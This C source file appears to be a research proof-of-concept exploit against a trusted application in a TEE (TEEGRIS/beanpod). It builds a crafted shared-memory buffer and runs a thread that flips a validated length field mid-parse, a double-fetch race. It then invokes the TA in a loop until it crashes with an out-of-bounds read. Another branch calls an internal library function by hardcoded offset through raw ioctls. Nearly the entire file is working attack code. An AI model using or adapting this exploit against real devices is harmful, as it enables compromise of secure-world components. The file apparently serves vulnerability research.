#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include "tee_client_api.h"
#include "repro.h"
#include "tee.h"
#include <dlfcn.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


TEEC_Result (*TEEC_OpenSession_impl)(TEEC_Context*,
			     TEEC_Session*,
			     const TEEC_UUID*,
			     uint32_t,
			     const void*,
			     TEEC_Operation*,
			     uint32_t*);
TEEC_Result (*TEEC_InitializeContext_impl)(const char*, TEEC_Context*);
void (*TEEC_FinalizeContext_impl)(TEEC_Context*);
void (*TEEC_CloseSession_impl)(TEEC_Session*);
TEEC_Result (*TEEC_InvokeCommand_impl)(TEEC_Session*,uint32_t,TEEC_Operation*,uint32_t*);
TEEC_Result (*TEEC_RegisterSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
typedef TEEC_Result (*teec_pre_process_operation_impl_t)(TEEC_Context* ctx,
            TEEC_Operation* operation,
            struct tee_ioctl_param* params,
            TEEC_SharedMemory* shms);

void cleanup_shm(){
#if EMULATE
        system("ipcrm -M 0x13337");
        system("ipcrm -M 0x13338");
        system("ipcrm -M 0x13339");
        system("ipcrm -M 0x1333a");
#endif
}

//TEEC_Result (*TEEC_AllocateSharedMemory_impl)(TEEC_Context*, TEEC_SharedMemory*);
#define teec_pre_process_operation_offset 0x2434

uintptr_t get_lib_base(const char *libname) {
    FILE *fp = fopen("/proc/self/maps", "r");
    if (!fp) {
        perror("fopen");
        return 0;
    }

    char line[512];
    while (fgets(line, sizeof(line), fp)) {
        if (strstr(line, libname)) {
            uintptr_t base = 0;
            // The address range looks like "7f9a2c0000-7f9a2e0000 ..."
            if (sscanf(line, "%lx-%*lx", &base) == 1) {
                fclose(fp);
                return base;
            }
        }
    }

    fclose(fp);
    return 0;
}



typedef struct custom_struct {
    int smth;
    int buffer[(0x1000-sizeof(int))/sizeof(int)];
} custom_struct;

void* mod_thread(void* arg){
    custom_struct *cs = (custom_struct*)arg;
    int* ints = cs->buffer;
    while(1){
        ints[0x1000/sizeof(int) - 2] = 0x00000010;
                                      // fffefdfc
        ints[0x1000/sizeof(int) - 2] = 0x000f0010;
    }
}

#if EMULATE
/*
 * The TA parses the input buffer as a list of (tag, length) entries. For the
 * entry at offset 0x18 it reads the length at 0x1a-0x1b, validates it, and then
 * reads it *again* before using it (the two fetches are the reads at PC 0xe368
 * and 0xe36c that Exploration records for this TA). Flipping the high byte of
 * that length between the two reads turns a validated 0x0004 into 0xc004 and
 * the TA reads far past the end of the buffer.
 *
 * The header below is the one from the Exploration seed that reaches the double
 * fetch (beanpod/harness/0801_fuzz/in/suspicious_inputs_replay/), so the parser
 * takes the same path as during the campaign.
 */
#define DF_LEN_OFF   0x1b   /* high byte of the double-fetched length          */
#define DF_LEN_SAFE  0x00   /* length 0x0004 - passes the check                */
#define DF_LEN_EVIL  0xc0   /* length 0xc004 - out-of-bounds read when re-read */

static const unsigned char df_header[] = {
    0x00, 0xff, 0xff, 0xed, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00,
    0x33, 0x00, 0x00, 0x00, 0x06, 0x00, 0x0c, 0x00,
    0x06, 0x00, 0x04, 0x00, 0x00,
};

static void put_df_layout(void *mem_area)
{
    unsigned char *p = (unsigned char *)mem_area;
    memcpy(p, df_header, sizeof(df_header));
    memset(p + sizeof(df_header), 0x80, 0x1000 - sizeof(df_header));
}

/* Race the high byte of the length while the TA is parsing. */
void* mod_thread_shm(void* arg){
    volatile unsigned char *len_hi = (volatile unsigned char*)arg + DF_LEN_OFF;
    while (1) {
        *len_hi = DF_LEN_SAFE;
        *len_hi = DF_LEN_EVIL;
    }
}
#endif


void put_layout(void *mem_area1){

    custom_struct *cs = (custom_struct*)mem_area1;
    cs->smth = 0x1111; // any value
    int* ints = cs->buffer;
    char* chars = (char*)ints;
    
    printf("custom_struct at: %p\n", cs);
    printf("custom_struct at: %p\n", cs->buffer);
    printf("custom_struct at: %p\n", &ints[0x1000/sizeof(int) - 2]);

    ints[0] = 0x00000004;   // offset:4 iVar12


    ints[1] = 0x00000000;   // offset:8 
    ints[2] = 0x00000fe4;   // offset:0xc
    ints[3] = 0x00000005;   //0x10: checked_variable can be 0x4
    
    ints[4] = 0x0000000a;   //0x14, checked here:  param1_buffer_size < ints[4] + 4U
    ints[5] = 0x00ff0fff;   //0x18
    ints[6] = 0x7bbbbbbb;
    ints[7] = 0x7ccccccc; 
    ints[8] = 0x000000dd;

    ints[0x1000/sizeof(int) - 5] = 0x00000004;
    ints[0x1000/sizeof(int) - 4] = 0x00000004;  // third fetch [??? here is the length?]
    ints[0x1000/sizeof(int) - 3] = 0x00000004;  // 0xff8: param1 to buggy_function
                                  // fbfaf9f8
    ints[0x1000/sizeof(int) - 2] = 0x00000010;  // 0xffc: param1's size/length
                                  // fffefdfc
}

void send_req(TEEC_Context *context, TEEC_Session *session)
{
    pthread_t tid;

#if EMULATE 
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_MEMREF_TEMP_INPUT,TEEC_MEMREF_TEMP_OUTPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[0].tmpref.buffer = mem_area1;  
    op.params[0].tmpref.size =  0x1000;
    op.params[1].tmpref.buffer = mem_area2; 
    op.params[1].tmpref.size =  0x1000; 
  
    put_df_layout(mem_area1);

    /* The double fetch is in the *input* buffer (params[0]), so that is what
       has to be modified while the TA runs. */
    if (pthread_create(&tid, NULL, mod_thread_shm, mem_area1) != 0) {
        perror("pthread_create failed");
        return;
    }
#else
    void* mem_area1 = allocate_param_mem(context, 0x1000);
    void* mem_area2 = allocate_param_mem(context, 0x1000);
    
    TEEC_SharedMemory shm2 = { };
    shm2.flags = TEEC_MEM_INPUT | TEEC_MEM_OUTPUT;
    shm2.buffer = mem_area2; // Buffer in use by application
    shm2.size = 0x1000;
    TEEC_Result res2 = TEEC_RegisterSharedMemory_impl(context, &shm2);
    printf("TEEC_RegisterSharedMemory result: %x \n", res2);
    uint32_t err_origin;
    TEEC_Operation op;
    memset(&op, 0, sizeof(op));
    op.paramTypes = TEEC_PARAM_TYPES(TEEC_VALUE_INOUT,TEEC_MEMREF_TEMP_INPUT,
                                     TEEC_NONE, TEEC_NONE);
    printf("params: 0x%lx\n", op.paramTypes);
    
    op.params[1].tmpref.buffer = mem_area1; 
    op.params[1].tmpref.size = 0x1000; 
    
    /* 
    op.params[1].memref.parent = &shm2; 
    op.params[1].memref.size =  shm2.size; 
    op.params[1].memref.offset =  0; 
    */
    op.params[0].value.a = 4;
    op.params[0].value.b = 4;
	
	memset(mem_area2, 0x41, 0x90);
        //((char*)mem_area2)[0x20] = 0;
    
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }
#endif
 
    

#if EMULATE
    /* Winning the race is probabilistic, so keep invoking until the TA is gone
       (the on-device PoC is run in a loop for the same reason, Section V). */
    TEEC_Result res = TEEC_SUCCESS;
    const char *env = getenv("POC_ATTEMPTS");
    int attempts = env ? atoi(env) : 200;
    for (int i = 0; i < attempts; i++) {
        res = TEEC_InvokeCommand_impl(session, 0x0, &op, &err_origin);
        if (res == 0xFFFF3024 /* TEE_ERROR_TARGET_DEAD */) {
            printf("[!] TA died after %d invocations -> double fetch triggered\n", i + 1);
            break;
        }
    }
#else

#define TEEC_CONFIG_PAYLOAD_REF_COUNT 4
    uint64_t buf[(sizeof(struct tee_ioctl_invoke_arg) +
            TEEC_CONFIG_PAYLOAD_REF_COUNT *
                sizeof(struct tee_ioctl_param)) /
            sizeof(uint64_t)] = { 0 };
    struct tee_ioctl_buf_data buf_data;
    struct tee_ioctl_invoke_arg *arg;
    struct tee_ioctl_param *params;
    TEEC_Result res;
    uint32_t eorig;
    TEEC_SharedMemory shm[TEEC_CONFIG_PAYLOAD_REF_COUNT];
    int rc;
    buf_data.buf_ptr = (uintptr_t)buf;
    buf_data.buf_len = sizeof(buf);

    arg = (struct tee_ioctl_invoke_arg *)buf;
    arg->num_params = TEEC_CONFIG_PAYLOAD_REF_COUNT;
    params = (struct tee_ioctl_param *)(arg + 1);

    arg->session = session->session_id;
    arg->func = 0x100b;
    
    op.session = session;
   
	teec_pre_process_operation_impl_t teec_pre_process_operation_impl =
        (teec_pre_process_operation_impl_t)((uint8_t*)get_lib_base("libteecli.so") + teec_pre_process_operation_offset);			
 
    res = teec_pre_process_operation_impl(session->ctx, &op, params, shm);
    if (res != TEEC_SUCCESS) {
        printf("teec_pre_process_operation failed!! %x\n", res);
        exit(-1);
    }

	strcpy(shm[1].buffer, "wtf???");
	printf("shm: %s\n", shm[1].buffer);
	mem_area2 = shm[1].buffer;
	memset(mem_area2, 0x41, 0x90);
        //((char*)mem_area2)[0x20] = 0;
	printf("shm: %s\n", shm[1].buffer);
    
    if (pthread_create(&tid, NULL, mod_thread, mem_area2) != 0) {
        perror("pthread_create failed");
        return;
    }

    rc = ioctl(session->ctx->fd, TEE_IOC_INVOKE, &buf_data);
    res = arg->ret;
    err_origin = arg->ret_origin; 

#endif
    printf("TEEC_Result: %x origin: err_origin: %x\n", res, err_origin);
}


int main(int argc, char **argv)
{
    char* ta = "08010203000000000000000000000000";
    TEEC_UUID *uuid = teegris_uuid(ta);

    TEEC_Context context;
    TEEC_Session session;
    uint32_t err_origin;
    TEEC_Result res;

    cleanup_shm();
    load_functions();

    // Initialize context
    res = TEEC_InitializeContext_impl(NULL, &context);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_InitializeContext failed with code 0x%x\n", res);
        exit(-1);
    }
    // Open session to trusted application
    res = TEEC_OpenSession_impl(&context, &session, uuid, TEEC_LOGIN_PUBLIC,
                           NULL, NULL, &err_origin);
    if (res != TEEC_SUCCESS) {
        printf("TEEC_OpenSession failed with code 0x%x origin 0x%x\n",
               res, err_origin);
        TEEC_FinalizeContext_impl(&context);
        exit(-1);
    }

    // write banner
    printf("[+] sending query...\n");
    send_req(&context, &session);
    printf("[+] done...\n");
    TEEC_CloseSession_impl(&session);
    TEEC_FinalizeContext_impl(&context);
    return 0;
}
